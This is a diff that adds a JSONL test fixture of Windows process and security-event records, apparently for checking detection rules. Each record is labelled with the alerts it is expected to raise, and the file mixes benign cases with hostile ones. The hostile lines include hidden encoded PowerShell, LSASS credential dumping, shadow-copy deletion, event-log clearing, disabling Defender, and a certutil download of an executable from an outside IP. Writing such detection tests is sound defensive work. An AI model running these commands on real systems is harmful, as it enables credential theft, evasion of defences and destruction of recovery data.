@@ -1,0 +1,29 @@
+{"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "User": "CORP\\jdoe", "ParentImage": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE", "_expect": ["ps-encoded"]}
+{"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell /EncodedCommand JABjAD0ATgBlAHcA", "User": "CORP\\svc-backup", "_expect": ["ps-encoded"]}
+{"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell -ec JABzAD0ATgBlAHcA", "User": "CORP\\jdoe", "_expect": ["ps-encoded"]}
+{"Image": "C:\\Tools\\procdump64.exe", "CommandLine": "procdump64.exe -ma lsass.exe C:\\Temp\\l.dmp", "User": "CORP\\adm-temp", "_expect": ["lsass-dump"]}
+{"Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 648 C:\\Temp\\l.dmp full lsass", "User": "SYSTEM", "_expect": ["lsass-dump"]}
+{"Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin.exe delete shadows /all /quiet", "User": "SYSTEM", "_expect": ["inhibit-recovery"]}
+{"Image": "C:\\Windows\\System32\\bcdedit.exe", "CommandLine": "bcdedit /set {default} recoveryenabled no", "User": "SYSTEM", "_expect": ["inhibit-recovery"]}
+{"EventID": 1102, "Channel": "Security", "User": "CORP\\adm-temp", "_expect": ["log-cleared"]}
+{"Image": "C:\\Windows\\System32\\wevtutil.exe", "CommandLine": "wevtutil.exe cl System", "User": "SYSTEM", "_expect": ["log-cleared"]}
+{"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /create /tn Updater /tr C:\\Users\\Public\\u.exe /sc minute /mo 5", "User": "CORP\\jdoe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "_expect": ["schtask-create"]}
+{"EventID": 4624, "LogonType": 10, "IpAddress": "203.0.113.50", "TargetUserName": "adm-temp", "_expect": ["rdp-external"]}
+{"EventID": 4720, "TargetUserName": "support$admin", "SubjectUserName": "adm-temp", "_expect": ["user-created"]}
+{"Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "cmd /c rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"", "User": "CORP\\jdoe", "_expect": ["rundll32-script", "cmd-loose"]}
+{"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell Set-MpPreference -DisableRealtimeMonitoring $true", "User": "SYSTEM", "_expect": ["defender-off"]}
+{"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -urlcache -f http://198.51.100.9/a.exe a.exe", "User": "CORP\\jdoe", "_expect": ["certutil-download"]}
+{"EventID": 4769, "TicketEncryptionType": "0x17", "ServiceName": "MSSQLSvc-prod", "TargetUserName": "jdoe", "_expect": ["kerberoast"]}
+{"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -File C:\\Scripts\\inventory.ps1", "User": "CORP\\svc-inv", "_expect": []}
+{"Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c dir", "User": "CORP\\jdoe", "_expect": []}
+{"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /create /tn VendorUpdate /xml C:\\Program Files\\Vendor\\task.xml", "User": "SYSTEM", "ParentImage": "C:\\Windows\\System32\\msiexec.exe", "_expect": []}
+{"EventID": 4624, "LogonType": 10, "IpAddress": "10.20.1.15", "TargetUserName": "adm-ops", "_expect": []}
+{"EventID": 4624, "LogonType": 2, "IpAddress": "-", "TargetUserName": "jdoe", "_expect": []}
+{"EventID": 4769, "TicketEncryptionType": "0x12", "ServiceName": "MSSQLSvc-prod", "TargetUserName": "jdoe", "_expect": []}
+{"EventID": 4769, "TicketEncryptionType": "0x17", "ServiceName": "FS01$", "TargetUserName": "jdoe", "_expect": []}
+{"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -hashfile C:\\Temp\\a.zip SHA256", "User": "CORP\\jdoe", "_expect": []}
+{"Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin list shadows", "User": "CORP\\adm-ops", "_expect": []}
+{"EventID": 4720, "TargetUserName": "new.hire", "SubjectUserName": "helpdesk", "_expect": []}
+{"Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe printui.dll,PrintUIEntry /ia", "User": "CORP\\jdoe", "_expect": []}
+{"Image": "C:\\Windows\\System32\\wevtutil.exe", "CommandLine": "wevtutil.exe qe Security /c:5", "User": "CORP\\adm-ops", "_expect": []}
+{"Image": "C:\\Windows\\System32\\notepad.exe", "CommandLine": "notepad.exe C:\\Users\\jdoe\\notes.txt", "User": "CORP\\jdoe", "_expect": []}
